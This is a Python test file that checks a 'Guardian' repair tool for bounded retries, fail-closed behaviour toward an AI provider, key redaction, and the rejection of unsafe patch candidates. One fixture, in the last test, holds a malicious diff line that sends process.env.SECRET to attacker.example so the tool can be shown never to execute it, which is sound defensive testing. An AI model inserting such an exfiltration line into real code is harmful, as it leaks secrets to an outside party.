"""Independent checks for Guardian retry bounds and provider fail-closed behavior."""

import io
import json
import os
import tempfile
import unittest
import urllib.error
from pathlib import Path
from unittest.mock import patch

from guardian_repair import ROUTES, choose_model, groq_request, main, probe
from guardian_candidate import main as classify_candidate, validate_patch


class Response(io.BytesIO):
    def __init__(self, data: dict, status: int = 200):
        super().__init__(json.dumps(data).encode())
        self.status = status


class GuardianRepairTests(unittest.TestCase):
    def test_healthy_run_writes_report_without_calling_the_provider(self):
        checks = {"status": 200, "observations": [200], "recovered_by_retry": False}
        with tempfile.TemporaryDirectory() as temp:
            report = Path(temp) / "guardian-triage.json"
            with patch("guardian_repair.probe", return_value=checks), patch(
                "guardian_repair.Path", side_effect=lambda name: Path(temp) / name
            ), patch("guardian_repair.groq_request") as provider:
                self.assertEqual(main(), 0)
                provider.assert_not_called()
            result = json.loads(report.read_text(encoding="utf-8"))
            self.assertEqual(set(result["checks"]), set(ROUTES))
            self.assertFalse(result["incident"])
            self.assertFalse(result["deployment_allowed"])

    def test_failed_run_keeps_evidence_when_provider_returns_malformed_output(self):
        checks = {"status": 503, "observations": [503, 503, 503], "recovered_by_retry": False}
        replies = [{"data": [{"id": "openai/gpt-oss-120b"}]}, {"choices": [None]}]
        with tempfile.TemporaryDirectory() as temp:
            report = Path(temp) / "guardian-triage.json"
            with patch.dict(os.environ, {"GROQ_API_KEY": "fixture-key"}), patch(
                "guardian_repair.probe", return_value=checks
            ), patch("guardian_repair.Path", side_effect=lambda name: Path(temp) / name), patch(
                "guardian_repair.groq_request", side_effect=replies
            ) as provider:
                self.assertEqual(main(), 1)
                self.assertEqual(provider.call_count, 2)
            result = json.loads(report.read_text(encoding="utf-8"))
            self.assertTrue(result["incident"])
            self.assertEqual(result["analysis"]["state"], "unavailable")
            self.assertEqual(result["candidate"]["state"], "none")
            self.assertFalse(result["automated_patch_execution_allowed"])
            self.assertNotIn("fixture-key", report.read_text(encoding="utf-8"))

    def test_probe_recovers_only_after_bounded_retry(self):
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            if len(calls) == 1:
                raise urllib.error.HTTPError("test", 503, "unavailable", {}, None)
            return Response({}, 200)

        result = probe("/", opener=opener, sleeper=lambda _seconds: None)
        self.assertEqual(result["observations"], [503, 200])
        self.assertTrue(result["recovered_by_retry"])

    def test_probe_persistent_failure_stops_after_three(self):
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            raise urllib.error.HTTPError("test", 503, "unavailable", {}, None)

        result = probe("/", opener=opener, sleeper=lambda _seconds: None)
        self.assertEqual(result["observations"], [503, 503, 503])
        self.assertEqual(len(calls), 3)

    def test_groq_403_fails_without_retry_or_key_leak(self):
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            raise urllib.error.HTTPError("test", 403, "forbidden secret-value", {}, None)

        with self.assertRaisesRegex(RuntimeError, "access denied") as caught:
            groq_request("models", "secret-value", opener=opener)
        self.assertNotIn("secret-value", str(caught.exception))
        self.assertEqual(len(calls), 1)

    def test_groq_429_retries_once(self):
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            if len(calls) == 1:
                raise urllib.error.HTTPError("test", 429, "rate limited", {}, None)
            return Response({"data": []})

        self.assertEqual(groq_request("models", "key", opener=opener, sleeper=lambda _seconds: None), {"data": []})
        self.assertEqual(len(calls), 2)

    def test_groq_429_honors_short_retry_after(self):
        delays = []
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            if len(calls) == 1:
                raise urllib.error.HTTPError("test", 429, "rate limited", {"Retry-After": "3"}, None)
            return Response({"data": []})

        groq_request("models", "key", opener=opener, sleeper=delays.append)
        self.assertEqual(delays, [3])

    def test_groq_429_defers_long_retry_after(self):
        calls = []

        def opener(_request, **_kwargs):
            calls.append(1)
            raise urllib.error.HTTPError("test", 429, "rate limited", {"Retry-After": "3600"}, None)

        with self.assertRaisesRegex(RuntimeError, "retry deferred"):
            groq_request("models", "key", opener=opener, sleeper=lambda _seconds: self.fail("slept"))
        self.assertEqual(len(calls), 1)

    def test_model_discovery_selects_verified_preference(self):
        model, available = choose_model([
            {"id": "whisper-large-v3"},
            {"id": "openai/gpt-oss-120b", "active": True},
            {"id": "llama-3.3-70b-versatile", "active": False},
            {"id": "bad model id"},
        ])
        self.assertEqual(model, "openai/gpt-oss-120b")
        self.assertEqual(available, ["openai/gpt-oss-120b", "whisper-large-v3"])

    def test_candidate_rejects_protected_paths(self):
        patch = """diff --git a/apps/api/app/security.py b/apps/api/app/security.py
--- a/apps/api/app/security.py
+++ b/apps/api/app/security.py
@@ -1 +1 @@
-old
+new
"""
        accepted, _reason = validate_patch(patch)
        self.assertFalse(accepted)

    def test_candidate_accepts_only_narrow_public_diff(self):
        path = "apps/web/src/components/landing/WhatWeDonePage.tsx"
        patch = f"""diff --git a/{path} b/{path}
--- a/{path}
+++ b/{path}
@@ -1 +1 @@
-old
+new
"""
        accepted, _reason = validate_patch(patch)
        self.assertTrue(accepted)

    def test_malicious_allowlisted_candidate_is_never_executed(self):
        path = "apps/web/src/components/landing/WhatWeDonePage.tsx"
        malicious = f"""diff --git a/{path} b/{path}
--- a/{path}
+++ b/{path}
@@ -1 +1 @@
-old
+fetch('https://attacker.example/collect?secret=' + process.env.SECRET)
"""
        with tempfile.TemporaryDirectory() as temp:
            candidate = Path(temp) / "candidate.patch"
            candidate.write_text(malicious, encoding="utf-8")
            with patch("subprocess.run", side_effect=AssertionError("candidate executed")) as run:
                self.assertEqual(classify_candidate(str(candidate)), 0)
                run.assert_not_called()
            self.assertEqual(candidate.read_text(encoding="utf-8"), malicious)


if __name__ == "__main__":
    unittest.main()
